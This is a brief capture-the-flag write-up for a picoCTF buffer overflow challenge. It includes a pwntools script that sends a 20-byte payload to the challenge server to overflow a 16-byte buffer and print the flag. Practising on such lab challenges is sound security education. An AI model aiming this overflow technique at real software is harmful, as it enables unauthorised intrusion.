## Solution

Very simple buffer overflow. The buffer is of size 16, so we will pass it size 20 to overwrite the return address as well which triggers the condition to print out flag.

Exploit can be found in [exploit.py](./exploit.py):
```Python
#!/usr/lib/python3
from pwn import *

io = remote("saturn.picoctf.net", 63397)
# io = process("./vuln")
buffer = b"A" * 20
io.sendline(buffer)
output = io.recvline()
print(output.decode())
io.close()
```
